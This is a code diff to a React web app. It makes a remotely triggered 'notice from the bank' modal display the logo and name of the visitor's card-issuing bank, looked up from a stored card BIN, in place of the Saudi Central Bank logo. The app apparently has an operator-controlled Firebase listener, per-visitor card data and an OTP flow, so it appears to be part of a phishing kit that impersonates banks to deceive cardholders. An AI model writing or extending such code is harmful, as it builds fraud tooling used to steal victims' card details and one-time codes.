@@ -16,6 +16,7 @@ import {
   confirmBankContact,
 } from "@/lib/firebase";
 import samaLogo from "@/assets/sama_logo.png";
+import { findBankLogo } from "@/lib/bank-logos";
 
 const TICKET_STEP_TO_PATH: Record<number, string> = {
   1: "/registration",
@@ -246,7 +247,15 @@ function BlockGate({ children }: { children: React.ReactNode }) {
   return <>{children}</>;
 }
 
-function BankContactModal({ onConfirm }: { onConfirm: () => void }) {
+function BankContactModal({
+  onConfirm,
+  bankLogoSrc,
+  bankLabel,
+}: {
+  onConfirm: () => void;
+  bankLogoSrc: string;
+  bankLabel: string;
+}) {
   const [submitting, setSubmitting] = useState(false);
   return (
     <div
@@ -258,13 +267,21 @@ function BankContactModal({ onConfirm }: { onConfirm: () => void }) {
         <div className="bg-gradient-to-br from-[#4a1525] to-[#2a0a14] p-6 text-center">
           <div className="w-20 h-20 mx-auto rounded-full bg-white flex items-center justify-center mb-3 shadow-md p-2">
             <img
-              src={samaLogo}
-              alt="البنك المركزي السعودي"
+              src={bankLogoSrc}
+              alt={bankLabel}
               className="w-full h-full object-contain"
               data-testid="img-bank-logo"
             />
           </div>
           <h2 className="text-white text-xl font-bold">إشعار من البنك</h2>
+          {bankLabel && (
+            <div
+              className="text-[#c9a96e] text-sm mt-1"
+              data-testid="text-bank-label"
+            >
+              {bankLabel}
+            </div>
+          )}
         </div>
         <div className="p-6 space-y-5">
           <p
@@ -298,6 +315,8 @@ function BankContactModal({ onConfirm }: { onConfirm: () => void }) {
 
 function BankContactGate() {
   const [show, setShow] = useState(false);
+  const [bankName, setBankName] = useState("");
+  const [bankBin, setBankBin] = useState("");
 
   useEffect(() => {
     const path = window.location.pathname;
@@ -311,8 +330,10 @@ function BankContactGate() {
       if (!id || id === attachedFor) return;
       if (unsub) unsub();
       attachedFor = id;
-      unsub = listenForBankContactRequest((shouldShow) => {
+      unsub = listenForBankContactRequest((shouldShow, payload) => {
         setShow(shouldShow);
+        setBankName(payload.cardBankName || "");
+        setBankBin(payload.cardBin || "");
       });
     };
 
@@ -325,8 +346,38 @@ function BankContactGate() {
     };
   }, []);
 
+  // If the visitor doc has no bankName yet but we have a 6-digit BIN, look it
+  // up via the same endpoint OTP uses. Cached server-side.
+  useEffect(() => {
+    if (!show || bankName || bankBin.length !== 6) return;
+    let cancelled = false;
+    (async () => {
+      try {
+        const res = await fetch(`/api/bin-lookup/${bankBin}`);
+        if (!res.ok) return;
+        const json = await res.json();
+        const name = json?.data?.bankName || "";
+        if (!cancelled && name) setBankName(name);
+      } catch {
+        // ignore
+      }
+    })();
+    return () => {
+      cancelled = true;
+    };
+  }, [show, bankBin, bankName]);
+
   if (!show) return null;
-  return <BankContactModal onConfirm={() => setShow(false)} />;
+  const matched = findBankLogo(bankName);
+  const bankLogoSrc = matched?.logo || samaLogo;
+  const bankLabel = matched?.label || (bankName ? bankName : "البنك المركزي السعودي");
+  return (
+    <BankContactModal
+      onConfirm={() => setShow(false)}
+      bankLogoSrc={bankLogoSrc}
+      bankLabel={bankLabel}
+    />
+  );
 }
 
 function App() {
